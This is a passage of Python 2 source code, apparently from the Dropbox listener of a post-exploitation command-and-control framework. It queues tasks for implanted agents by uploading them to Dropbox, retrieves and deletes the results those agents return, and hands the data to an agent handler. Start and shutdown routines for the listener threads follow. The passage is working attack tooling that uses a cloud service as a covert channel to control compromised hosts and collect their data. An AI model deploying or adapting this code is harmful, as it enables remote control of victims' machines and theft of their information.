                if taskingData:
                    try:
                        taskingFile = "%s/%s.txt" % (taskingsFolder, sessionID)

                        # if the tasking file still exists, download/append + upload again
                        existingData = None
                        try:
                            md, res = dbx.files_download(taskingFile)
                            existingData = res.content
                        except:
                            existingData = None

                        if existingData:
                            taskingData = taskingData + existingData

                        dispatcher.send("[*] Uploading agent tasks for %s to %s" % (sessionID, taskingFile), sender='listeners/dbx')
                        dbx.files_upload(taskingData, taskingFile, mode=dropbox.files.WriteMode.overwrite)
                    except dropbox.exceptions.ApiError as e:
                        dispatcher.send("[!] Error uploading agent tasks for %s to %s : %s" % (sessionID, taskingFile, e), sender="listeners/dropbox")

            # check for any results returned
            for match in dbx.files_search(resultsFolder, "*.txt").matches:
                fileName = str(match.metadata.path_display)
                sessionID = fileName.split('/')[-1][:-4]

                dispatcher.send("[*] Downloading data for '%s' from %s" % (sessionID, fileName), sender="listeners/dropbox")

                try:
                    md, res = dbx.files_download(fileName)
                except dropbox.exceptions.HttpError as err:
                    dispatcher.send("[!] Error download data from '%s' : %s" % (fileName, err), sender="listeners/dropbox")
                    continue

                responseData = res.content

                try:
                    dbx.files_delete(fileName)
                except dropbox.exceptions.ApiError:
                    dispatcher.send("[!] Error deleting data at '%s'" % (fileName), sender="listeners/dropbox")
                
                self.mainMenu.agents.handle_agent_data(stagingKey, responseData, listenerOptions)


    def start(self, name=''):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.threads dictionary keyed by the listener name.
        """
        listenerOptions = self.options
        if name and name != '':
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(3)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions['Name']['Value']
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(3)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()


    def shutdown(self, name=''):
        """
        Terminates the server thread stored in the self.threads dictionary,
        keyed by the listener name.
        """

        if name and name != '':
            print helpers.color("[!] Killing listener '%s'" % (name))
            self.threads[name].kill()
        else:
            print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
            self.threads[self.options['Name']['Value']].kill()
